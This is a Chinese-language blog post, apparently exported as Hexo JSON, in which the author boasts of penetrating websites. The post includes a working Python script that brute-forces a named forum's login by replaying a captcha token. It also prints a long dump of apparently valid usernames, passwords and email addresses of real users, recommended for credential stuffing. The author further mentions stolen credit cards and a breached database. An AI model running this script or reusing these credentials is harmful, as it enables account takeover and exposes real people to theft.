rex930504@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: r0980018123, Password: a0980018123, Status Code: 200   -\n    Response: {\"data\":{\"status\":1}}\n    Username: sa0981232712, Password: a0981232712, Status Code: 200 sa0981232712@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: q0903738680, Password: a0903738680-, Status Code: 200 a0903738680@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: s0973886245, Password: a0973886245, Status Code: 200 s0973886245@gmail.com -\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0900413183, Password: a0900413183, Status Code: 200 dog970dog@yahoo.com.tw\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0921781869, Password: a0921781869, Status Code: 200 sxiao6071@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: q0970788600, Password: a0970788600, Status Code: 200 aaa0970788600@gmail.com -\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0903828673, Password: a0903828673, Status Code: 200 C107113210@nkust.edu.tw\n    Response: {\"data\":{\"status\":1}}\n    Username: t0972811154, Password: a0972811154, Status Code: 200 t0972811154@gmail.com -\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0986199269, Password: a0986199269, Status Code: 200 doublew0423@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: z0970566527, Password: a0970566527, Status Code: 200 hunhun168168268@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: z0988257795, Password: a0988257795, Status Code: 200 a0988257795@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0939282769, Password: a0939282769, Status Code: 200 axz123123@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: z0952070619, Password: a0952070619, Status Code: 200 a0952070619@gmail.com   -\n    Response: {\"data\":{\"status\":1}}\n    Username: ab0970763930, Password: a0970763930, Status Code: 200 a0970763930@icloud.com\n    Response: {\"data\":{\"status\":1}}\n    Username: s0905180925, Password: a0905180925, Status Code: 200 a0905180925@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: c0906522264, Password: a0906522264, Status Code: 200 a0906522264@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0932729141, Password: a0932729141, Status Code: 200 a0932729141@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: z0920212123, Password: a0920212123, Status Code: 200 sp40384579@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0925093877, Password: a0925093877, Status Code: 200 a0925093877@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: lj0965137654, Password: a0965137654, Status Code: 200 melody19991018@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: bo0906364202, Password: a0906364202, Status Code: 200 continue88@yahoo.com.tw\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0979767832, Password: a0979767832, Status Code: 200 a080888888@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0979619251, Password: a0979619251, Status Code: 200 aa0979619251@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0972808320, Password: a0972808320, Status Code: 200 a0972808320@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: as0986307029, Password: a0986307029, Status Code: 200 as0986307029@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: ab0976744597, Password: a0976744597, Status Code: 200 a0976744597@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0907746473, Password: a0907746473, Status Code: 200 a0907746473@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: z09781279, Password: a09781279, Status Code: 200 xx192922@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: j0978099261, Password: a0978099261, Status Code: 200 smile0978099265@yahoo.com.tw\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0939015430, Password: a0939015430, Status Code: 200 a0939015430@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: s0965005858, Password: a0965005858, Status Code: 200 a0965005858@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0905664221, Password: a0905664221, Status Code: 200\n    Response: {\"data\":{\"status\":1}}\n\n\n\n但是!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n\n打下帳號頂多獲得facebook，身分證.信用卡等等，我確實拿到了信用卡好幾張2張過期 3張未過期，但是他們共同點，無法使用。\n\n也沒有勒索功能。純屬自嗨!?\n\n滲透mysql庫呢，去年我打下了一個mysql庫，他被滲透原因，把mysql庫的密碼，寫在客戶端，被我逆向取出。\n\n也沒有勒索價值，mysql庫權限十分嚴格，我無法提權到系統root 只有mysql的root。\n\n或許我應該去打企業或是更高價值的地方。\n","source":"_posts/未來滲透思路.md","raw":"---\ntitle: 未來滲透思路\ndate: 2025-06-01 20:01:12\ntags:\n---\n\n現今的滲透\n已經AI化了\n各種腳本  打下網站  \n\n大多數公司都使用cloudflare了 本身是有限制某些特殊參數傳入數據庫\n除非工程師程式邏輯有問題\n\n就像是如今全球服[精靈樂章](https://www.x-legend.com/online/grandfantasia-origin/zh-hant/) 的 API 整數溢出  在內存中 輸入(65536 / 2 -1) 就能觸發\n\n[幻想神域](https://ff.x-legend.com.tw/index_in.php) 台服的轉帳系統異常一樣\n\n都可以構成無限複製虛寶，販賣給玩家是有錢賺的。\n\n某些網站的帳密數據洩漏例如巴哈姆特，可以間接造成大量網站的防禦功能失效。\n\n台灣論壇巴哈姆特的防腳本Captcha存在漏洞，實際上不用點擊圖片就能無限制瘋狂登入測試帳密，對於駭客沒有起到防禦作用，頂多防治低端駭客。\n\n\n\n以下是巴哈姆特的exploit\n\n    import requests\n    import re\n    def login_gamer(i: str, b: str):\n        url = \"https://user.gamer.com.tw/ajax/do_login.php\"\n        boundary = \"----WebKitFormBoundary43kaavhQRXxSIS8T\"\n        alternativeCaptcha=\"00fc6930b735e3cad682e0853a5e7de13b89d97fd3ec5ad167f2ba6b\"\n\n        # Cookies  boundary  alternativeCaptcha 也要更新\n        cookies = {\n            \"_ga\": \"GA1.1.1957928680.1732967366\",\n            \"ckM\": \"2531167198\",\n            \"buap_modr\": \"p014\",\n            \"buap_puoo\": \"p301\",\n            \"ckGUILD_lastBrowse\": \"[[%22393%22%2C%22%E6%AD%B7%E5%8F%B2%E3%81%AE%E7%B4%B3%E5%A3%AB%E5%85%AC%E6%9C%83<%E3%82%9D%CF%89%E3%83%BB%22]%2C[%2216197%22%2C%22%E5%A0%B4%E5%A4%96%E4%BA%BA%E7%94%9F%22]]\",\n            \"__cf_bm\": \"mKDJpSKveQTKgl_fc6yuPtBbSyXcrhujBogkMvHPNso-1734356145-1.0.1.1-Q4xXxyx1VD13BCae5ygrGeY76tskUbcg3HDEXHnwcFUld5j1UZ_lbQKNVUun8pDMU5CvDEDJrPkzKFVo9ivUpA\",\n        }\n        headers = {\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\",\n            \"Accept\": \"*/*\",\n            \"Accept-Encoding\": \"gzip, deflate, br, zstd\",\n            \"Accept-Language\": \"zh-TW,zh;q=0.9,ja-JP;q=0.8,ja;q=0.7\",\n            \"Cache-Control\": \"no-cache\",\n            \"Origin\": \"https://user.gamer.com.tw\",\n            \"Pragma\": \"no-cache\",\n            \"Referer\": \"https://user.gamer.com.tw/login.php\",\n            \"X-Requested-With\": \"XMLHttpRequest\",\n            \"Content-Type\": f\"multipart/form-data; boundary={boundary}\"\n        }\n\n        body = (\n            f\"--{boundary}\\r\\n\"\n            \"Content-Disposition: form-data; name=\\\"userid\\\"\\r\\n\\r\\n\"\n            f\"{i}\\r\\n\"\n            f\"--{boundary}\\r\\n\"\n            \"Content-Disposition: form-data; name=\\\"password\\\"\\r\\n\\r\\n\"\n            f\"{b}\\r\\n\"\n            f\"--{boundary}\\r\\n\"\n            \"Content-Disposition: form-data; name=\\\"autoLogin\\\"\\r\\n\\r\\n\"\n            \"T\\r\\n\"\n            f\"--{boundary}\\r\\n\"\n            \"Content-Disposition: form-data; name=\\\"alternativeCaptcha\\\"\\r\\n\\r\\n\"\n            f\"{alternativeCaptcha}\\r\\n\"\n            f\"--{boundary}\\r\\n\"\n            \"Content-Disposition: form-data; name=\\\"twoStepAuth\\\"\\r\\n\\r\\n\"\n            \"\\r\\n\"\n            f\"--{boundary}--\\r\\n\"\n        )\n\n    \n        response = requests.post(url, headers=headers, cookies=cookies, data=body.encode(\"utf-8\"))\n\n\n        if '\"error\"' not in response.text:\n            print(f\"✅ Username: {i}, Password: {b}, Status Code: {response.status_code}\")\n            print(\"Response:\", response.text)\n\n            if i in usernames:\n                usernames.remove(i)\n                with open(\"9999.txt\", \"w\", encoding=\"utf-8\") as f:\n                    f.write('\\n'.join(usernames) + '\\n')\n\n            # 加入 99.txt\n            with open(\"99.txt\", \"a\", encoding=\"utf-8\") as f:\n                f.write(i + '\\n')\n\n        elif '\"CSRF_TOKEN_ERROR\"' in response.text:\n            print(f\"🚫 CSRF ERROR Username: {i}, Password: {b}, Status Code: {response.status_code}\")\n            print(\"Response:\", response.text)\n\n        return\n\n\n\n    with open(\"9999.txt\", \"r\", encoding=\"utf-8\") as file:\n        usernames = [line.strip() for line in file if line.strip()]\n\n    for i in usernames:\n        c = re.sub(r'[a-zA-Z]', 'a', i)\n        b = c.replace(\"aa\", \"a\")  \n        login_gamer(i, b)\n\n\n以下是戰利品，簡簡單單的腳本可以造成如此可怕的破壞性。 可以將其拿去撞庫其他網站。\n\n    Username: aa0903465890, Password: a0903465890, Status Code: 200  a0903465890@gmail.com 動漫風\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0952121590, Password: a0952121590, Status Code: 200  bodishenqi@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0909165363, Password: a0909165363, Status Code: 200 a0952148610@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0903892528, Password: a0903892528, Status Code: 200 b0903892528@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: w0906997609, Password: a0906997609, Status Code: 200 datealive24561715@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: ab0907711641, Password: a0907711641, Status Code: 200 a0932602130@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0985883382, Password: a0985883382, Status Code: 200 b0985883382@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0902445622, Password: a0902445622, Status Code: 200 a0902445622@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: q0968223897, Password: a0968223897, Status Code: 200  a0968223897@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0910525, Password: a0910525, Status Code: 200 aa0928252609@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: e0973943179, Password: a0973943179, Status Code: 200 lovebaby19810802@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0918681748, Password: a0918681748, Status Code: 200 love0918681748@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: st0986808392, Password: a0986808392, Status Code: 200 st882810@yahoo.com.tw\n    Response: {\"data\":{\"status\":1}}\n    Username: z0968954488, Password: a0968954488, Status Code: 200 gg122504531@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: q0935962575, Password: a0935962575, Status Code: 200 asdw95049@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: z0953956567, Password: a0953956567, Status Code: 200 a0953956567@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0987890752, Password: a0987890752, Status Code: 200 young30987@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: as0906566327, Password: a0906566327, Status Code: 200 a0906566327@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: f0916727293, Password: a0916727293, Status Code: 200\n    Response: {\"data\":{\"status\":1}}\n    Username: b09158500, Password: a09158500, Status Code: 200 b0909158500@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: jy0907007336, Password: a0907007336, Status Code: 200 chizhengyou535@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: zx0980821344, Password: a0980821344, Status Code: 200 a0980821344@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: a709980792, Password: a709980792, Status Code: 200 msn709980792@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: l0903019107, Password: a0903019107, Status Code: 200 adwx83@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: gg0910288118, Password: a0910288118, Status Code: 200 louser9487@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: c0905610929, Password: a0905610929, Status Code: 200 a0905610929@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: c0968908771, Password: a0968908771, Status Code: 200 gavin62115@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: s097944987, Password: a097944987, Status Code: 200 jason930312@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: je0928511681, Password: a0928511681, Status Code: 200 a0928511681@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: ab0916543726, Password: a0916543726, Status Code: 200 chan92726@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: l0909340420, Password: a0909340420, Status Code: 200 a0909340420@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: os0984028800, Password: a0984028800, Status Code: 200 \n    Response: {\"data\":{\"status\":1}}\n    Username: b0977300591, Password: a0977300591, Status Code: 200 a0977300591@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0965107208, Password: a0965107208, Status Code: 200 a0965107208@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0905795377, Password: a0905795377, Status Code: 200 aa0905795377@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: s0951115, Password: a0951115, Status Code: 200    s0951115@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: ji0966109453, Password: a0966109453, Status Code: 200 a0966109453@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: as0905427665, Password: a0905427665, Status Code: 200 a0905427665@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    ✅ Username: p090749499, Password: pp090749499, Status Code: 200  p090749499@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    ✅ Username: t0912287071, Password: tt0912287071, Status Code: 200  t091228.t7071@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    ✅ Username: j090276, Password: jj090276, Status Code: 200 j090276@my.cmsh.cyc.edu.tw\n    Response: {\"data\":{\"status\":1}}\n    ✅ Username: aa0981073215, Password: aa0981073215, Status Code: 200  a0981073215@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    ✅ Username: l0990209, Password: l0990209, Status Code: 200  z6865105@gmail.com shipeicen992@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    ✅ Username: h10911218, Password: h10911218, Status Code: 200 kencatu@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    ✅ Username: m0976722676, Password: m0976722676, Status Code: 200 scorpio2014520@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    ✅ Username: j0905911501, Password: j0905911501, Status Code: 200 jeff29218829@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    ✅ Username: f0980466920, Password: f0980466920, Status Code: 200 poror81333@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    ✅ Username: s0987550111, Password: s0987550111, Status Code: 200 s0987550111@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    以下密碼同帳號\n    ok0927719082  okok0927719082@gmail.com\n    m0965007291 s9007311@gmail.com\n    k0966525111  cruoen@gmail.com 2000-08-17 6889\n    k0963106226 k0963106226\n    aa0920686666  Aa0920686666@icloud.com\n    b0935429595 b0935429595@gmail.com\n    d09231202 willy5931@gmail.com\n    w0965572698\n    k0970283000 kaononog@gmail.com\n    vi0909211939 erli90889@gmail.com\n    js0975546884 js0975546884@gmail.com\n    s0970572524 w674961@gmail.com 這個\n    q0903571195 jay136001@gmail.com\n    aa0909503439 50014@thjh.tc.edu.tw\n    q0905394257 q0905394257@gmail.com\n    w0906181410\n    av0907325862 0963521qq@gmail.com  有\n    Username: aa09210035, Password: a09210035, Status Code: 200  a09210822@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: u0979254001, Password: a0979254001, Status Code: 200 unicorn0979254001@icloud.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0912633373, Password: a0912633373, Status Code: 200 aa0912633373@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: q0911805750, Password: a0911805750, Status Code: 200 a0911805750@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0966176188, Password: a0966176188, Status Code: 200\n    Response: {\"data\":{\"status\":1}}\n    Username: ab0905292491, Password: a0905292491, Status Code: 200 abc092053@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: z0938918616, Password: a0938918616, Status Code: 200 a0938918616@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0960960809, Password: a0960960809, Status Code: 200 love088613559@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: z0920194989, Password: a0920194989, Status Code: 200 a0920194989@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: z0909591313, Password: a0909591313, Status Code: 200 cmy0909591313@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: r0972880749, Password: a0972880749, Status Code: 200 r0972880749@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: ab0976681217, Password: a0976681217, Status Code: 200 a0976681217@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0960300399, Password: a0960300399, Status Code: 200 a0960300399@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0903060747, Password: a0903060747, Status Code: 200 a0903060747@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0903559094, Password: a0903559094, Status Code: 200 a090355909432@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: k0933944907, Password: a0933944907, Status Code: 200 annime284@icloud.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0905879083, Password: a0905879083, Status Code: 200 a0905879083@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: pe0988977410, Password: a0988977410, Status Code: 200 a0988977410@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0908279601, Password: a0908279601, Status Code: 200 csc908279601@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: m0905660182, Password: a0905660182, Status Code: 200 a0905660182@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0908550262, Password: a0908550262, Status Code: 200 a0908550262@gmail.com -\n    Response: {\"data\":{\"status\":1}}\n    Username: as0966120010, Password: a0966120010, Status Code: 200 q0966120010@gmail.com -\n    Response: {\"data\":{\"status\":1}}\n    Username: b0965332258, Password: a0965332258, Status Code: 200 a0965332258@gmail.com -\n    Response: {\"data\":{\"status\":1}}\n    Username: t0909514986, Password: a0909514986, Status Code: 200 a0909514986@gmail.com -\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0908365535, Password: a0908365535, Status Code: 200 b0908365535@gmail.com -\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0980458882, Password: a0980458882, Status Code: 200 a871888@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: p0965494790, Password: a0965494790, Status Code: 200\n    Response: {\"data\":{\"status\":1}}\n    Username: yx0974043504, Password: a0974043504, Status Code: 200 a0974043504@gmail.com -\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0979042990, Password: a0979042990, Status Code: 200 jess518313@yahoo.com\n    Response: {\"data\":{\"status\":1}}\n    Username: s0963566296, Password: a0963566296, Status Code: 200 a0963566296@yahoo.com.tw\n    Response: {\"data\":{\"status\":1}}\n    Username: s0928452731, Password: a0928452731, Status Code: 200 a0928452731@gmail.com st2630322@gmail.com -\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0975285779, Password: a0975285779, Status Code: 200 a0975297472@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: z0911202824, Password: a0911202824, Status Code: 200 \n    Response: {\"data\":{\"status\":1}}\n    Username: aa0989569855, Password: a0989569855, Status Code: 200 -acps91152@gmail.com  -\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0912660626, Password: a0912660626, Status Code: 200 -a060943@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: s0909070825, Password: a0909070825, Status Code: 200 a0909070825@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: s0936780533, Password: a0936780533, Status Code: 200\n    Response: {\"data\":{\"status\":1}}\n    Username: b0979580968, Password: a0979580968, Status Code: 200 b0979580968@gmail.com  -\n    Response: {\"data\":{\"status\":1}}\n    Username: ab0902101002, Password: a0902101002, Status Code: 200 aa0902101002@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0985430586, Password: a0985430586, Status Code: 200 a0985430586@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0906730857, Password: a0906730857, Status Code: 200 \n    Response: {\"data\":{\"status\":1}}\n    Username: aa0963756676, Password: a0963756676, Status Code: 200 a0963756676@gmail.com -\n    Response: {\"data\":{\"status\":1}}\n    Username: q0981388805, Password: a0981388805, Status Code: 200 weileyhu0813@yahoo.com.tw -\n    Response: {\"data\":{\"status\":1}}\n    Username: w0908450298, Password: a0908450298, Status Code: 200 rex930504@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: r0980018123, Password: a0980018123, Status Code: 200   -\n    Response: {\"data\":{\"status\":1}}\n    Username: sa0981232712, Password: a0981232712, Status Code: 200 sa0981232712@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: q0903738680, Password: a0903738680-, Status Code: 200 a0903738680@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: s0973886245, Password: a0973886245, Status Code: 200 s0973886245@gmail.com -\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0900413183, Password: a0900413183, Status Code: 200 dog970dog@yahoo.com.tw\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0921781869, Password: a0921781869, Status Code: 200 sxiao6071@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: q0970788600, Password: a0970788600, Status Code: 200 aaa0970788600@gmail.com -\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0903828673, Password: a0903828673, Status Code: 200 C107113210@nkust.edu.tw\n    Response: {\"data\":{\"status\":1}}\n    Username: t0972811154, Password: a0972811154, Status Code: 200 t0972811154@gmail.com -\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0986199269, Password: a0986199269, Status Code: 200 doublew0423@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: z0970566527, Password: a0970566527, Status Code: 200 hunhun168168268@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: z0988257795, Password: a0988257795, Status Code: 200 a0988257795@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0939282769, Password: a0939282769, Status Code: 200 axz123123@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: z0952070619, Password: a0952070619, Status Code: 200 a0952070619@gmail.com   -\n    Response: {\"data\":{\"status\":1}}\n    Username: ab0970763930, Password: a0970763930, Status Code: 200 a0970763930@icloud.com\n    Response: {\"data\":{\"status\":1}}\n    Username: s0905180925, Password: a0905180925, Status Code: 200 a0905180925@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: c0906522264, Password: a0906522264, Status Code: 200 a0906522264@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0932729141, Password: a0932729141, Status Code: 200 a0932729141@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: z0920212123, Password: a0920212123, Status Code: 200 sp40384579@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0925093877, Password: a0925093877, Status Code: 200 a0925093877@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: lj0965137654, Password: a0965137654, Status Code: 200 melody19991018@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: bo0906364202, Password: a0906364202, Status Code: 200 continue88@yahoo.com.tw\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0979767832, Password: a0979767832, Status Code: 200 a080888888@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0979619251, Password: a0979619251, Status Code: 200 aa0979619251@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0972808320, Password: a0972808320, Status Code: 200 a0972808320@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: as0986307029, Password: a0986307029, Status Code: 200 as0986307029@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: ab0976744597, Password: a0976744597, Status Code: 200 a0976744597@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0907746473, Password: a0907746473, Status Code: 200 a0907746473@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: z09781279, Password: a09781279, Status Code: 200 xx192922@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: j0978099261, Password: a0978099261, Status Code: 200 smile0978099265@yahoo.com.tw\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0939015430, Password: a0939015430, Status Code: 200 a0939015430@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: s0965005858, Password: a0965005858, Status Code: 200 a0965005858@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0905664221, Password: a0905664221, Status Code: 200\n    Response: {\"data\":{\"status\":1}}\n\n\n\n但是!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n\n打下帳號頂多獲得facebook，身分證.信用卡等等，我確實拿到了信用卡好幾張2張過期 3張未過期，但是他們共同點，無法使用。\n\n也沒有勒索功能。純屬自嗨!?\n\n滲透mysql庫呢，去年我打下了一個mysql庫，他被滲透原因，把mysql庫的密碼，寫在客戶端，被我逆向取出。\n\n也沒有勒索價值，mysql庫權限十分嚴格，我無法提權到系統root 只有mysql的root。\n\n或許我應該去打企業或是更高價值的地方。\n","slug":"未來滲透思路","published":1,"updated":"2025-06-01T12:34:21.290Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwae0015zrlrgg0o2ku1","content":"<p>現今的滲透<br>已經AI化了<br>各種腳本  打下網站  </p>\n<p>大多數公司都使用cloudflare了 本身是有限制某些特殊參數傳入數據庫<br>除非工程師程式邏輯有問題</p>\n<p>就像是如今全球服<a href=\"https://www.x-legend.com/online/grandfantasia-origin/zh-hant/\">精靈樂章</a> 的 API 整數溢出  在內存中 輸入(65536 &#x2F; 2 -1) 就能觸發</p>\n<p><a href=\"https://ff.x-legend.com.tw/index_in.php\">幻想神域</a> 台服的轉帳系統異常一樣</p>\n<p>都可以構成無限複製虛寶，販賣給玩家是有錢賺的。</p>\n<p>某些網站的帳密數據洩漏例如巴哈姆特，可以間接造成大量網站的防禦功能失效。</p>\n<p>台灣論壇巴哈姆特的防腳本Captcha存在漏洞，實際上不用點擊圖片就能無限制瘋狂登入測試帳密，對於駭客沒有起到防禦作用，頂多防治低端駭客。</p>\n<p>以下是巴哈姆特的exploit</p>\n<pre><code>import requests\nimport re\ndef login_gamer(i: str, b: str):\n    url = &quot;https://user.gamer.com.tw/ajax/do_login.php&quot;\n    boundary = &quot;----WebKitFormBoundary43kaavhQRXxSIS8T&quot;\n    alternativeCaptcha=&quot;00fc6930b735e3cad682e0853a5e7de13b89d97fd3ec5ad167f2ba6b&quot;\n\n    # Cookies  boundary  alternativeCaptcha 也要更新\n    cookies = &#123;\n        &quot;_ga&quot;: &quot;GA1.1.1957928680.1732967366&quot;,\n        &quot;ckM&quot;: &quot;2531167198&quot;,\n        &quot;buap_modr&quot;: &quot;p014&quot;,\n        &quot;buap_puoo&quot;: &quot;p301&quot;,\n        &quot;ckGUILD_lastBrowse&quot;: &quot;[[%22393%22%2C%22%E6%AD%B7%E5%8F%B2%E3%81%AE%E7%B4%B3%E5%A3%AB%E5%85%AC%E6%9C%83&lt;%E3%82%9D%CF%89%E3%83%BB%22]%2C[%2216197%22%2C%22%E5%A0%B4%E5%A4%96%E4%BA%BA%E7%94%9F%22]]&quot;,\n        &quot;__cf_bm&quot;: &quot;mKDJpSKveQTKgl_fc6yuPtBbSyXcrhujBogkMvHPNso-1734356145-1.0.1.1-Q4xXxyx1VD13BCae5ygrGeY76tskUbcg3HDEXHnwcFUld5j1UZ_lbQKNVUun8pDMU5CvDEDJrPkzKFVo9ivUpA&quot;,\n    &#125;\n    headers = &#123;\n        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&quot;,\n        &quot;Accept&quot;: &quot;*/*&quot;,\n        &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br, zstd&quot;,\n        &quot;Accept-Language&quot;: &quot;zh-TW,zh;q=0.9,ja-JP;q=0.8,ja;q=0.7&quot;,\n        &quot;Cache-Control&quot;: &quot;no-cache&quot;,\n        &quot;Origin&quot;: &quot;https://user.gamer.com.tw&quot;,\n        &quot;Pragma&quot;: &quot;no-cache&quot;,\n        &quot;Referer&quot;: &quot;https://user.gamer.com.tw/login.php&quot;,\n        &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;,\n        &quot;Content-Type&quot;: f&quot;multipart/form-data; boundary=&#123;boundary&#125;&quot;\n    &#125;\n\n    body = (\n        f&quot;--&#123;boundary&#125;\\r\\n&quot;\n        &quot;Content-Disposition: form-data; name=\\&quot;userid\\&quot;\\r\\n\\r\\n&quot;\n        f&quot;&#123;i&#125;\\r\\n&quot;\n        f&quot;--&#123;boundary&#125;\\r\\n&quot;\n        &quot;Content-Disposition: form-data; name=\\&quot;password\\&quot;\\r\\n\\r\\n&quot;\n        f&quot;&#123;b&#125;\\r\\n&quot;\n        